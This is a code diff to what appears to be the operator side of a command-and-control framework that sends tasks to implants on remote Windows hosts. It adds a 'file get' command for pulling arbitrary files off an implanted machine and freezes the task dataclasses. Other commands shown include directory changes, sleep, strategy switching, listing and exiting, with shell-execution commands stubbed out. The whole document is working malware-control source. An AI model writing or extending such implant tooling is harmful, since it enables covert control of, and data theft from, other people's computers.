@@ -91,7 +91,16 @@ async def task_tree(command, args, implant_uuid):
         # special command
         case "help":
             # uses this list to pull the docstrings from, and turn into a help menu
-            dataclasses = [Cd, Sleep, StratPost, StratGet, StratList, StratActive, Exit]
+            dataclasses = [
+                Cd,
+                Sleep,
+                StratPost,
+                StratGet,
+                StratList,
+                StratActive,
+                FileGet,
+                Exit,
+            ]
             descriptions: list = get_description_of_dataclasses(dataclasses)
 
             # add in barriers:
@@ -194,6 +203,21 @@ async def task_tree(command, args, implant_uuid):
                     "Invalid strat command. Use `strat post <strategy_name>`, `strat get <strategy_name>`, or `strat list`",
                 )
 
+        case "file":
+            if args.startswith("get"):
+                file_path = args[4:]  # Extract file path after "get "
+                try:
+                    task = FileGet(
+                        implant_uuid=implant_uuid, file_path=file_path
+                    ).to_task()
+                    return (ResultType.TASK, task)
+                except ParseError as e:
+                    return (ResultType.ERROR, str(e))
+            else:
+                return (
+                    ResultType.ERROR,
+                    "Invalid file command. Use `file get <file_path>`",
+                )
         case "exit":
             try:
                 task = Exit(implant_uuid=implant_uuid).to_task()
@@ -205,13 +229,13 @@ async def task_tree(command, args, implant_uuid):
             return (ResultType.ERROR, "Invalid command")  # Or some other response
 
 
-@dataclass
+@dataclass(frozen=True)
 class TaskDetail:
     task_name: str
     args: dict
 
 
-@dataclass
+@dataclass(frozen=True)
 class Task:
     # task_uuid: str  # added by server
     implant_uuid: str
@@ -233,7 +257,7 @@ def create_and_verify_task(implant_uuid: str, task: TaskDetail):
     return task_as_dict
 
 
-# @dataclass
+# @dataclass(frozen=True)
 # class Cmd:
 #     """
 #     [placeholder command for dev] Run a command on the host via cmd.exe
@@ -263,7 +287,7 @@ def create_and_verify_task(implant_uuid: str, task: TaskDetail):
 #         return final_task
 
 
-@dataclass
+@dataclass(frozen=True)
 class Cd:
     R"""
     Change the current working directory on the host. Ex: `cd C:\\Users\\`
@@ -293,7 +317,7 @@ class Cd:
         return final_task
 
 
-@dataclass
+@dataclass(frozen=True)
 class Sleep:
     R"""
     Sleep for a specified number of seconds on the host. Ex: `sleep 5`
@@ -322,7 +346,7 @@ class Sleep:
         return final_task
 
 
-@dataclass
+@dataclass(frozen=True)
 class StratPost:
     R"""
     Set the post strategy for the implant. Ex: `strat post my_post_strategy`
@@ -379,7 +403,7 @@ class StratGet:
         return final_task
 
 
-@dataclass
+@dataclass(frozen=True)
 class StratList:
     R"""
     List the available strategies for the implant.
@@ -408,7 +432,7 @@ class StratList:
         return final_task
 
 
-@dataclass
+@dataclass(frozen=True)
 class StratActive:
     R"""
     List the active strategy for the implant.
@@ -430,7 +454,36 @@ class StratActive:
         return final_task
 
 
-@dataclass
+@dataclass(frozen=True)
+class FileGet:
+    R"""
+    Get a file from the host the implant is running on. Ex: `file get C:\\Users\\user\\file.txt`
+    """
+
+    command_name = "file get"
+    implant_uuid: str
+    file_path: str
+
+    def __post_init__(self):
+        """Automatically run something when the dataclass is created."""
+        if not self.file_path:
+            raise ParseError(
+                "The 'file_path' argument cannot be None or empty. Ex: `file get <file_path>`: `file get C:\\Users\\user\\file.txt`"
+            )
+
+    def to_task(self) -> dict:
+        """Convert the dataclass to a task style dictionary structure."""
+
+        task_args = {"file_path": self.file_path}
+        task_detail = TaskDetail(task_name=self.command_name, args=task_args)
+
+        final_task = create_and_verify_task(
+            implant_uuid=self.implant_uuid, task=task_detail
+        )
+        return final_task
+
+
+@dataclass(frozen=True)
 class Exit:
     R"""
     Exit the implant. This will kill the implant process on the host, don't expect a response back from the implant with this command.
@@ -452,7 +505,7 @@ class Exit:
         return final_task
 
 
-@dataclass
+@dataclass(frozen=True)
 class Ls:
     R"""
     List the contents of a directory on the host. Ex: `ls C:\\Users\\`
@@ -484,7 +537,7 @@ class Ls:
         return final_task
 
 
-# @dataclass
+# @dataclass(frozen=True)
 # class Powershell:
 #     """
 #     [placeholder command for dev] Run a command on the host via powershell.exe. Ex: `powershell -c "<your_command>"`
